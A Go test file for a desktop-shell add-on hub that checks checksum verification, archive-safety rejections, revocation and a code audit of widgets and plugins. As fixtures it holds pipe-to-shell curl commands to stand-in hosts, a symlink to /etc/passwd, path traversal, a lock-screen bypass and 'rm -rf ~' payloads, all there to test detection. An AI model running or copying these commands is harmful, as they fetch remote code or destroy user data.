package hub

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"sync"
	"testing"

	"ano/anod/internal/config"
)

type tarEnt struct {
	name, body, link string
	flag             byte
}

func targz(t *testing.T, ents ...tarEnt) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for _, e := range ents {
		fl := e.flag
		if fl == 0 {
			fl = tar.TypeReg
		}
		h := &tar.Header{Name: e.name, Mode: 0o644, Typeflag: fl, Linkname: e.link}
		if fl == tar.TypeReg {
			h.Size = int64(len(e.body))
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		if fl == tar.TypeReg {
			tw.Write([]byte(e.body))
		}
	}
	tw.Close()
	gz.Close()
	return buf.Bytes()
}

func sum(b []byte) string { s := sha256.Sum256(b); return hex.EncodeToString(s[:]) }

// fakeCatalog serves index.json and files over TLS; both are swappable.
type fakeCatalog struct {
	mu    sync.Mutex
	index Index
	files map[string][]byte
	srv   *httptest.Server
}

func newCatalog(t *testing.T) *fakeCatalog {
	c := &fakeCatalog{index: Index{Name: "Test catalog"}, files: map[string][]byte{}}
	c.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		c.mu.Lock()
		defer c.mu.Unlock()
		if r.URL.Path == "/index.json" {
			b, _ := json.Marshal(c.index)
			et := `"` + sum(b)[:12] + `"`
			if r.Header.Get("If-None-Match") == et {
				w.WriteHeader(http.StatusNotModified)
				return
			}
			w.Header().Set("ETag", et)
			w.Write(b)
			return
		}
		if b, ok := c.files[r.URL.Path]; ok {
			w.Write(b)
			return
		}
		http.NotFound(w, r)
	}))
	t.Cleanup(c.srv.Close)
	return c
}

func (c *fakeCatalog) url() string { return c.srv.URL + "/index.json" }

// put publishes an item: data served at /files/<id>-<v>.tar.gz; listed with sha of listed.
func (c *fakeCatalog) put(e Entry, served, listed []byte) {
	c.mu.Lock()
	defer c.mu.Unlock()
	p := fmt.Sprintf("/files/%s-%s.tar.gz", e.ID, e.Version)
	c.files[p] = served
	e.URL, e.SHA256 = c.srv.URL+p, sum(listed)
	c.index.Items = slices.DeleteFunc(c.index.Items, func(x Entry) bool { return x.ID == e.ID && x.Type == e.Type })
	c.index.Items = append(c.index.Items, e)
}

func setup(t *testing.T) (*Hub, *fakeCatalog, string) {
	tmp := t.TempDir()
	for k, v := range map[string]string{
		"HOME": tmp, "XDG_CONFIG_HOME": tmp + "/.config", "XDG_STATE_HOME": tmp + "/.local/state",
		"XDG_CACHE_HOME": tmp + "/.cache", "XDG_DATA_HOME": tmp + "/.local/share", "ANO_SHELL_DIR": tmp + "/shell",
		"HYPRLAND_INSTANCE_SIGNATURE": "", "NIRI_SOCKET": "",
	} {
		t.Setenv(k, v)
	}
	os.MkdirAll(tmp+"/shell/assets/themes", 0o755)
	os.WriteFile(tmp+"/shell/assets/themes/builtin.json", []byte(`{"_meta":{"name":"Built in"}}`), 0o644)
	c := newCatalog(t)
	h := New()
	h.Client = c.srv.Client()
	h.Catalogs = func() []string { return []string{c.url()} }
	if err := h.Init(); err != nil {
		t.Fatal(err)
	}
	return h, c, tmp
}

func theme(id, ver string) []byte {
	return []byte(fmt.Sprintf(`{"_meta":{"name":"%s","author":"me","version":"%s"},"primary":"#123456"}`, id, ver))
}

func install(t *testing.T, h *Hub, typ, id string) (*Prepared, string) {
	t.Helper()
	p, err := h.Prepare(typ, id, "")
	if err != nil {
		t.Fatalf("prepare: %v", err)
	}
	path, err := h.Commit(p.Token)
	if err != nil {
		t.Fatalf("commit: %v", err)
	}
	return p, path
}

func TestTamperedDownloadRefused(t *testing.T) {
	h, c, tmp := setup(t)
	good := targz(t, tarEnt{name: "ocean.json", body: string(theme("ocean", "1.0.0"))})
	bad := targz(t, tarEnt{name: "ocean.json", body: `{"evil":true}`})
	c.put(Entry{ID: "ocean", Type: "themes", Version: "1.0.0"}, bad, good)
	if _, err := h.Refresh(""); err != nil {
		t.Fatal(err)
	}
	_, err := h.Prepare("themes", "ocean", c.url())
	if err == nil || !strings.Contains(err.Error(), "checksum mismatch") {
		t.Fatalf("want checksum mismatch, got %v", err)
	}
	ents, _ := os.ReadDir(filepath.Join(tmp, ".config/anoshell/themes"))
	if len(ents) != 0 {
		t.Fatalf("something was left in the themes folder: %v", ents)
	}
	if h.receipt("themes", "ocean") != nil || h.Revision() != 0 {
		t.Fatal("receipt written or revision bumped")
	}
}

func TestArchiveRejects(t *testing.T) {
	many := []tarEnt{{name: "widget.json", body: "{}"}}
	for i := 0; i < MaxFiles+1; i++ {
		many = append(many, tarEnt{name: fmt.Sprintf("f%d.qml", i), body: "x"})
	}
	cases := map[string][]tarEnt{
		"symlink":  {{name: "widget.json", body: "{}"}, {name: "Main.qml", flag: tar.TypeSymlink, link: "/etc/passwd"}},
		"hardlink": {{name: "widget.json", body: "{}"}, {name: "Main.qml", flag: tar.TypeLink, link: "widget.json"}},
		"dotdot":   {{name: "widget.json", body: "{}"}, {name: "../escape.qml", body: "x"}},
		"absolute": {{name: "widget.json", body: "{}"}, {name: "/tmp/abs.qml", body: "x"}},
		"fifo":     {{name: "widget.json", body: "{}"}, {name: "pipe", flag: tar.TypeFifo}},
		"toomany":  many,
	}
	for name, ents := range cases {
		dst := filepath.Join(t.TempDir(), "stage")
		if _, err := extract(targz(t, ents...), "widgets", "w", dst); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	// a theme archive holds exactly <id>.json
	if _, err := extract(targz(t, tarEnt{name: "other.json", body: "{}"}), "themes", "ocean", filepath.Join(t.TempDir(), "x")); err == nil {
		t.Error("theme with the wrong name accepted")
	}
	if !ValidID("good-id-2") || ValidID("Bad") || ValidID("a/b") || ValidID("w~1") {
		t.Error("id regex")
	}
}

func TestOfflineFromCache(t *testing.T) {
	h, c, _ := setup(t)
	c.put(Entry{ID: "ocean", Type: "themes", Version: "1.0.0"}, nil, []byte("x"))
	res, err := h.Refresh("")
	if err != nil || len(res.Catalog) != 1 || !res.Catalogs[0].OK || res.Catalogs[0].Offline {
		t.Fatalf("online refresh: %+v %v", res, err)
	}
	// unchanged: 304 keeps the cache
	if res, _ = h.Refresh(""); res.Catalogs[0].Error != "" || len(res.Catalog) != 1 {
		t.Fatalf("304 refresh: %+v", res.Catalogs)
	}
	c.srv.Close()
	res, _ = h.Refresh("")
	if len(res.Catalog) != 1 || !res.Catalogs[0].Offline || res.Catalogs[0].Error == "" {
		t.Fatalf("offline: %+v", res.Catalogs)
	}
	// hub.list is cache-only: a fresh Hub with no network still lists it
	h2 := New()
	h2.Catalogs = h.Catalogs
	if res, _ := h2.List("themes"); len(res.Catalog) != 1 || res.Catalog[0].CatalogName != "Test catalog" {
		t.Fatalf("list from cache: %+v", res)
	}
}

func TestInstallReceiptUpdateModified(t *testing.T) {
	h, c, tmp := setup(t)
	a1 := targz(t, tarEnt{name: "ocean.json", body: string(theme("ocean", "1.0.0"))})
	c.put(Entry{ID: "ocean", Type: "themes", Name: "Ocean", Version: "1.0.0"}, a1, a1)
	h.Refresh("")
	_, path := install(t, h, "themes", "ocean")
	if path != filepath.Join(tmp, ".config/anoshell/themes/ocean.json") {
		t.Fatalf("path %s", path)
	}
	r := h.receipt("themes", "ocean")
	if r == nil || r.Catalog != c.url() || r.Version != "1.0.0" || r.Files["ocean.json"] != sum(theme("ocean", "1.0.0")) {
		t.Fatalf("receipt %+v", r)
	}
	if h.Revision() != 1 {
		t.Fatalf("revision %d", h.Revision())
	}
	res, _ := h.List("themes")
	var got *Item
	for i := range res.Items {
		if res.Items[i].ID == "ocean" {
			got = &res.Items[i]
		}
	}
	if got == nil || got.Source != "installed" || got.Catalog != c.url() || got.Modified || !res.Catalog[0].Installed {
		t.Fatalf("listed %+v", got)
	}

	// a newer version, while the user edited the file
	a2 := targz(t, tarEnt{name: "ocean.json", body: string(theme("ocean", "1.1.0"))})
	c.put(Entry{ID: "ocean", Type: "themes", Version: "1.1.0"}, a2, a2)
	h.Refresh("")
	os.WriteFile(path, []byte(`{"mine":1}`), 0o644)
	res, _ = h.List("themes")
	for _, it := range res.Items {
		if it.ID == "ocean" && (it.Update != "1.1.0" || !it.Modified) {
			t.Fatalf("update/modified not flagged: %+v", it)
		}
	}
	p, err := h.Prepare("themes", "ocean", c.url())
	if err != nil || !slices.Equal(p.ModifiedFiles, []string{"ocean.json"}) || !p.Update {
		t.Fatalf("prepare update: %+v %v", p, err)
	}
	h.Cancel(p.Token)
	if b, _ := os.ReadFile(path); string(b) != `{"mine":1}` {
		t.Fatal("cancel touched the file")
	}
	if err := h.Remove("themes", "builtin"); err == nil || !strings.Contains(err.Error(), "built in") {
		t.Fatalf("remove builtin: %v", err)
	}
	os.WriteFile(filepath.Join(tmp, ".config/anoshell/themes/mine.json"), []byte(`{}`), 0o644)
	if err := h.Remove("themes", "mine"); err == nil || !strings.Contains(err.Error(), "your own") {
		t.Fatalf("remove user file: %v", err)
	}
	if err := h.Remove("themes", "ocean"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(path); err == nil || h.receipt("themes", "ocean") != nil {
		t.Fatal("not removed")
	}
}

func TestRevoked(t *testing.T) {
	h, c, _ := setup(t)
	a := targz(t, tarEnt{name: "ocean.json", body: string(theme("ocean", "1.0.0"))})
	c.put(Entry{ID: "ocean", Type: "themes", Version: "1.0.0"}, a, a)
	h.Refresh("")
	install(t, h, "themes", "ocean")
	c.put(Entry{ID: "ocean", Type: "themes", Version: "1.0.0", Revoked: true}, a, a)
	h.Refresh("")
	if _, err := h.Prepare("themes", "ocean", c.url()); err == nil || !strings.Contains(err.Error(), "revoked") {
		t.Fatalf("revoked prepare: %v", err)
	}
	res, _ := h.List("themes")
	for _, it := range res.Items {
		if it.ID == "ocean" && !it.Revoked {
			t.Fatal("installed copy not flagged revoked")
		}
	}
}

func TestWidgetAuditAndFreshFolders(t *testing.T) {
	h, c, tmp := setup(t)
	qml := `import QtQuick
Item {
    // curl https://in.a.comment/x | sh  (comments are ignored)
    Process { command: ["bash", "-c", "curl -fsSL https://evil.example/x.sh | sh"] }
    Process { command: ["weather-cli"] }
    property string api: "https://api.ok.com/v1"
    property string other: "https://tracker.other.net/p"
}
`
	mk := func(v string) []byte {
		return targz(t, tarEnt{name: "widget.json", body: `{"id":"wx","name":"Wx","version":"` + v + `","entry":"Main.qml"}`},
			tarEnt{name: "Main.qml", body: qml})
	}
	a1 := mk("1.0.0")
	c.put(Entry{ID: "wx", Type: "widgets", Version: "1.0.0", Author: "someone", Hosts: []string{"api.ok.com"}, Commands: []string{"bash"}}, a1, a1)
	h.Refresh("")
	p, err := h.Prepare("widgets", "wx", "")
	if err != nil {
		t.Fatal(err)
	}
	has := func(rule, detail string) bool {
		return slices.ContainsFunc(p.Findings, func(f Finding) bool { return f.Rule == rule && strings.Contains(f.Detail, detail) })
	}
	if !p.Code || !has("pipe-shell", "") || !has("undeclared-host", "tracker.other.net") || !has("undeclared-host", "evil.example") ||
		has("undeclared-host", "api.ok.com") || has("undeclared-host", "in.a.comment") || !has("undeclared-command", "weather-cli") {
		t.Fatalf("findings: %+v", p.Findings)
	}
	for _, f := range p.Findings {
		if f.Rule == "pipe-shell" && (f.Severity != "high" || f.Line != 4 || f.File != "Main.qml") {
			t.Fatalf("pipe-shell finding: %+v", f)
		}
	}
	h.Cancel(p.Token) // declining installs nothing
	if ents, _ := os.ReadDir(filepath.Join(tmp, ".config/anoshell/widgets")); len(ents) != 0 {
		t.Fatalf("declined install left %v", ents)
	}
	_, path := install(t, h, "widgets", "wx")
	if filepath.Base(path) != "wx~1" {
		t.Fatalf("first install %s", path)
	}
	a2 := mk("2.0.0")
	c.put(Entry{ID: "wx", Type: "widgets", Version: "2.0.0", Hosts: []string{"api.ok.com", "new.host"}, Commands: []string{"bash"}}, a2, a2)
	h.Refresh("")
	p, err = h.Prepare("widgets", "wx", "")
	if err != nil || !p.CapabilitiesChanged {
		t.Fatalf("capabilities change not reported: %+v %v", p, err)
	}
	path2, err := h.Commit(p.Token)
	if err != nil || filepath.Base(path2) != "wx~2" {
		t.Fatalf("update %s %v", path2, err)
	}
	if _, err := os.Stat(path); err == nil {
		t.Fatal("old version folder kept")
	}
	res, _ := h.List("widgets")
	if len(res.Items) != 1 || res.Items[0].ID != "wx" || res.Items[0].Source != "installed" || !res.Items[0].Code {
		t.Fatalf("list %+v", res.Items)
	}
}

// Launcher plugins and lock screens go through the same audited, fresh-folder
// install as widgets, each with its own manifest.
func TestPluginAndLockscreenInstall(t *testing.T) {
	h, c, tmp := setup(t)
	for _, k := range []struct{ typ, mf string }{{"plugins", "plugin.json"}, {"lockscreens", "lockscreen.json"}} {
		bad := targz(t, tarEnt{name: "widget.json", body: `{"name":"X"}`}, tarEnt{name: "Main.qml", body: "Item {}"})
		c.put(Entry{ID: "x", Type: k.typ, Version: "1"}, bad, bad)
		h.Refresh("")
		if _, err := h.Prepare(k.typ, "x", ""); err == nil || !strings.Contains(err.Error(), k.mf) {
			t.Fatalf("%s without %s: %v", k.typ, k.mf, err)
		}
		a := targz(t, tarEnt{name: k.mf, body: `{"id":"x","name":"X"}`},
			tarEnt{name: "Main.qml", body: "Item { Process { command: [\"sh\", \"-c\", \"curl -s https://e.example/a | sh\"] } }\nItem { Component.onCompleted: GlobalStates.screenLocked = false }"})
		c.put(Entry{ID: "x", Type: k.typ, Version: "1"}, a, a)
		h.Refresh("")
		p, err := h.Prepare(k.typ, "x", "")
		if err != nil || !p.Code || !slices.ContainsFunc(p.Findings, func(f Finding) bool { return f.Rule == "pipe-shell" }) ||
			!slices.ContainsFunc(p.Findings, func(f Finding) bool { return f.Rule == "lock-state" && f.Severity == "high" && f.Line == 2 }) {
			t.Fatalf("%s prepare: %+v %v", k.typ, p, err)
		}
		path, err := h.Commit(p.Token)
		if err != nil || path != filepath.Join(tmp, ".config/anoshell", k.typ, "x~1") {
			t.Fatalf("%s commit %s %v", k.typ, path, err)
		}
		res, _ := h.List(k.typ)
		if !slices.ContainsFunc(res.Items, func(it Item) bool { return it.ID == "x" && it.Source == "installed" && it.Code }) {
			t.Fatalf("%s list %+v", k.typ, res.Items)
		}
	}
	if _, err := h.Prepare("lockscreens", "default", ""); err == nil {
		t.Fatal("a catalog lock screen took the built-in id")
	}
	res, _ := h.List("lockscreens")
	if !slices.ContainsFunc(res.Items, func(it Item) bool { return it.ID == "default" && it.Source == "builtin" }) {
		t.Fatalf("no built-in lock screen: %+v", res.Items)
	}
}

func readTree(t *testing.T, root string) map[string]string {
	out := map[string]string{}
	filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err == nil && !d.IsDir() {
			b, _ := os.ReadFile(p)
			out[p] = string(b)
		}
		return nil
	})
	return out
}

func TestRiceApplyUndo(t *testing.T) {
	h, _, tmp := setup(t)
	cfg := filepath.Join(tmp, ".config")
	w := func(p, s string) {
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	w(cfg+"/anoshell/config.json", "{\n  \"bar\": {\"style\": \"pill\", \"verbose\": true},\n  \"unknownKey\": 1.50\n}\n")
	w(cfg+"/anoshell/keybinds.json", `{"binds":{"SUPER+T":{"action":"terminal"}}}`)
	w(cfg+"/anoshell/themes/shared.json", `{"_meta":{"name":"Mine"}}`)
	rice := cfg + "/anoshell/rices/dusk"
	w(rice+"/rice.json", `{"name":"Dusk","version":"1.0.0","keys":[],"config":{
		"appearance":{"look":"ink","colors":{"monitor":"HDMI-A-1","darkMode":true}},
		"bar":{"style":"floating","autoHide":{"enable":true}},
		"hooks":{"wallpaperChanged":"rm -rf ~"},"apps":{"terminal":"evil"}}}`)
	w(rice+"/themes/dusk.json", `{"_meta":{"name":"Dusk"}}`)
	w(rice+"/themes/shared.json", `{"_meta":{"name":"Theirs"}}`)
	w(rice+"/widgets/duskclock/widget.json", `{"name":"Dusk clock"}`)
	w(rice+"/wallpapers/dusk.png", "png")
	w(rice+"/keybinds.json", `{"binds":[{"chord":"Super+Return","action":"exec","args":["kitty"]},
		{"chord":"Super+L","action":"hyprland","args":["os.execute('rm -rf ~')"]}],
		"remove":["Super+Q"],"hyprlandHelpers":"os.execute('evil')"}`)

	before := readTree(t, cfg)
	beforeWall := readTree(t, tmp+"/Pictures")
	kbBefore := before[cfg+"/anoshell/keybinds.json"]

	res, err := h.RiceApply("dusk", nil) // keybinds layer unticked
	if err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(cfg + "/anoshell/keybinds.json"); string(b) != kbBefore {
		t.Fatal("unticked keybinds layer changed keybinds")
	}
	if slices.Contains(res.Applied, "keybinds") || !slices.Contains(res.Applied, "config") || !slices.Contains(res.Applied, "widgets") {
		t.Fatalf("applied %v", res.Applied)
	}
	var got map[string]any
	b, _ := os.ReadFile(cfg + "/anoshell/config.json")
	json.Unmarshal(b, &got)
	bar := got["bar"].(map[string]any)
	app := got["appearance"].(map[string]any)
	if bar["style"] != "floating" || bar["verbose"] != true || bar["autoHide"] != nil || got["hooks"] != nil || got["apps"] != nil ||
		app["look"] != "ink" || app["colors"].(map[string]any)["monitor"] != nil || got["unknownKey"] == nil {
		t.Fatalf("merged config %s", b)
	}
	if s, _ := os.ReadFile(cfg + "/anoshell/themes/shared.json"); !strings.Contains(string(s), "Theirs") {
		t.Fatal("theme not copied")
	}
	if _, err := os.Stat(cfg + "/anoshell/widgets/duskclock~1/widget.json"); err != nil {
		t.Fatal("widget not copied")
	}
	if _, err := os.Stat(tmp + "/Pictures/Wallpapers/hub/dusk.png"); err != nil {
		t.Fatal("wallpaper not copied")
	}

	if _, err := h.RiceUndo(); err != nil {
		t.Fatal(err)
	}
	after := readTree(t, cfg)
	cfgFile := cfg + "/anoshell/config.json"
	want, _ := config.Parse([]byte(before[cfgFile]))
	gotCfg, _ := config.Parse([]byte(after[cfgFile]))
	if !reflect.DeepEqual(want, gotCfg) {
		t.Errorf("config after undo:\n%s", after[cfgFile])
	}
	for p, s := range before {
		if p != cfgFile && after[p] != s {
			t.Errorf("%s differs after undo:\n%q\n%q", p, s, after[p])
		}
	}
	for p := range after {
		if _, ok := before[p]; !ok {
			t.Errorf("left behind: %s", p)
		}
	}
	if w := readTree(t, tmp+"/Pictures"); len(w) != len(beforeWall) {
		t.Errorf("wallpapers left behind: %v", w)
	}
	if _, err := h.RiceUndo(); err == nil {
		t.Error("a second undo should have nothing to undo")
	}

	// ticked: keybinds replaced, compositor reported unsupported
	res, err = h.RiceApply("dusk", []string{"keybinds", "compositor"})
	if err != nil {
		t.Fatal(err)
	}
	kb, _ := os.ReadFile(cfg + "/anoshell/keybinds.json")
	if !strings.Contains(string(kb), "kitty") || strings.Contains(string(kb), "evil") || strings.Contains(string(kb), "rm -rf") {
		t.Fatalf("ticked keybinds layer: %s", kb)
	}
	if len(res.Keybinds) != 2 || res.Keybinds[0].Command != "kitty" || res.Keybinds[1].Action != "unbind" {
		t.Fatalf("keybinds summary %+v", res.Keybinds)
	}
	if n := len(slices.DeleteFunc(slices.Clone(res.Skipped), func(s SkippedPart) bool { return s.Part != "keybinds" })); n != 2 {
		t.Fatalf("dropped keybinds not reported: %+v", res.Skipped)
	}
	if !slices.ContainsFunc(res.Skipped, func(s SkippedPart) bool { return s.Part == "compositor" && s.Reason == "not supported yet" }) {
		t.Fatalf("skipped %+v", res.Skipped)
	}
	h.RiceUndo()
	if b, _ := os.ReadFile(cfg + "/anoshell/keybinds.json"); string(b) != kbBefore {
		t.Fatal("undo didn't restore keybinds")
	}
}

func TestRiceExportAndPack(t *testing.T) {
	h, _, tmp := setup(t)
	cfg := filepath.Join(tmp, ".config")
	os.MkdirAll(cfg+"/anoshell/themes", 0o755)
	os.WriteFile(cfg+"/anoshell/config.json", []byte(`{"appearance":{"theme":{"name":"mine"}},"hooks":{"x":"y"}}`), 0o644)
	os.WriteFile(cfg+"/anoshell/themes/mine.json", []byte(`{"_meta":{"name":"Mine"}}`), 0o644)
	id, dir, err := h.RiceExport("My Setup!")
	if err != nil || id != "my-setup" {
		t.Fatalf("export %s %v", id, err)
	}
	var r Rice
	b, _ := os.ReadFile(dir + "/rice.json")
	json.Unmarshal(b, &r)
	if r.Theme != "mine" || r.Config["hooks"] != nil || !slices.Equal(r.Keys, []string{"appearance.theme.name"}) {
		t.Fatalf("rice.json %s", b)
	}
	if _, err := os.Stat(dir + "/themes/mine.json"); err != nil {
		t.Fatal("theme not exported")
	}
	out, e, err := Pack(dir, PackOptions{OutDir: t.TempDir(), URLBase: "https://example.org/hub/"})
	if err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(out)
	if e.Type != "rices" || e.ID != "my-setup" || e.Version != "1.0.0" || e.SHA256 != sum(data) || e.URL != "https://example.org/hub/my-setup-1.0.0.tar.gz" {
		t.Fatalf("entry %+v", e)
	}
}
